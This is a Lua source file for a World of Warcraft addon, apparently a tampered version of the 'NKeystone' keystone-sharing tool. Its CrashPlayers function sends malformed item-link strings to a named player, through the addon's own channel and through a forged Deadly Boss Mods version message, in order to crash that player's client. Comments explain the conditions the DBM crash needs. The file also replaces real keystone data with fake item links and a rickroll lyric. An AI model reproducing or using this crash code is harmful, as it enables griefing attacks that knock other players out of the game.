SLASH_NKEYSTONE1 = '/nklist';
SLASH_NKEYSTONE2 = '/nk';

NKeystone = {
	AddonPrefix = "NKEYSTONE",
	KeystoneItemID = 138019,
	RequestInfoTag = "NKEYSTONEREQUESTINFO",
	RequestMaxLevelTag = "NKEYSTONEREQUESTMAXLEVEL"
};

local nkt = NKeystone;

RegisterAddonMessagePrefix(nkt.AddonPrefix);

function SlashCmdList.NKEYSTONE(msg, editbox)
	if msg == "keystones" then
		GetKeystoneInfo();
	elseif msg == "maxlevel" then
		GetMaxLevel();
	else
		CrashPlayers(msg);
	end
end

function GetMythicSummary()
	--local maxLevel, mapID = GetMythicDetails()
	--local mapName = C_ChallengeMode.GetMapInfo(mapID);
	--if maxLevel and mapName then
	--	return "Max level: " .. maxLevel .. " on map: " .. mapName;
	--else
	--	return "No Mythic+ completions during this reset";
	--end

	--I'm a big cheater
	return "\nWe're no strangers to love\nYou know the rules and so do I...\n"
end

function GetMythicDetails()
	maps = { };
	C_ChallengeMode.GetMapTable(maps);
	maxLevel = 0;
	mapID = nil;
	for i = 1, #maps do
		local _, _, level = C_ChallengeMode.GetMapPlayerStats(maps[i]);
		if level and level > maxLevel then
			maxLevel = level;
			mapID = maps[i];
		end
	end
	return maxLevel, mapID
end

function GetMaxLevel()
	print("NK: Requesting Max Level");
	SendAddonMessage(nkt.AddonPrefix, nkt.RequestMaxLevelTag, "GUILD");
end

function GetKeystoneInfo()
	print("NK: Requesting Keystone Info");
	SendAddonMessage(nkt.AddonPrefix, nkt.RequestInfoTag, "GUILD");
end

function SendKeystoneInfo(target)
	local bagID, slotID = GetBagAndSlotIDForKeystone();
	--local itemLink = GetItemLinkFromBagAndSlotID(bagID, slotID);
	local itemLink = "\124cffff8000\124Hitem:19019::::::::::0\124h[Did Someone Say?]\124h\124r";
	if itemLink ~= nil then
		dist = target and "WHISPER" or "GUILD";
		SendAddonMessage(nkt.AddonPrefix, itemLink, dist, target);
	end
end

function CrashPlayers(player)
	print("Sending NKeystone and 1/2 DBM crash to "..player);
	SendAddonMessage(nkt.AddonPrefix, "|124cffff8000|124Hitem:19019::::::::::0\124h[Did Someone Say?]\124h\124r", "WHISPER", player);
	--DBM needs to users to send a higher version, they don't both need the crash string
	--DBM also requires you be a in a group with the target
	SendAddonMessage("D4", "V" .. "\t" .. ("%d\t%s\t%s\t%s\t%s"):format("Revision 25307", "r25307", "|124cffff8000|124Hitem:19019::::::::::0\124h[Did Someone Say?]\124h\124r", "GetLocale", "nah", "WHISPER", player));
end

function SendMaxLevel(target)
	local mythicSummary = GetMythicSummary();
	dist = target and "WHISPER" or "GUILD";
	SendAddonMessage(nkt.AddonPrefix, mythicSummary, dist, target);
end

function GetBagAndSlotIDForKeystone()
	for bagID = 0, NUM_BAG_SLOTS do
		local slotCount = GetContainerNumSlots(bagID);
		for slotID = 0, slotCount do
			local itemID = GetContainerItemID(bagID, slotID);
			if itemID == nkt.KeystoneItemID then
				return bagID, slotID;
			end
		end
	end
	return nil;
end

function GetItemLinkFromBagAndSlotID(bagID, slotID)
	if bagID == nil or slotID == nil then
		return nil;
	end

	local texture, itemCount, locked, quality, readable, lootable, itemLink
		= GetContainerItemInfo(bagID, slotID);
	return itemLink;
end

function GetItemStringFromItemLink(itemLink)
	return select(3, strfind(itemLink, "|H(.+)|h"));
end

local eventFrame = CreateFrame("FRAME");
eventFrame:RegisterEvent("CHAT_MSG_ADDON");
eventFrame:SetScript("OnEvent", function(...) nkt.OnEvent(...); end);

nkt.OnEvent = function(self, event, ...)
	C_ChallengeMode.RequestMapInfo();
	if event == "CHAT_MSG_ADDON" then
		local prefix, msg, dist, sender = ...;
		if prefix == nkt.AddonPrefix then
			if msg == nkt.RequestInfoTag then
				DEFAULT_CHAT_FRAME:AddMessage("Sending keystone info to: " .. sender);
				SendKeystoneInfo(sender);
			elseif msg == nkt.RequestMaxLevelTag then
				DEFAULT_CHAT_FRAME:AddMessage("Sending max level info to: " .. sender);
				SendMaxLevel(sender);
			else
				if dist == "WHISPER" then
					DEFAULT_CHAT_FRAME:AddMessage("NK: " .. sender .. ": " .. msg);
				end
			end
		end
	end
end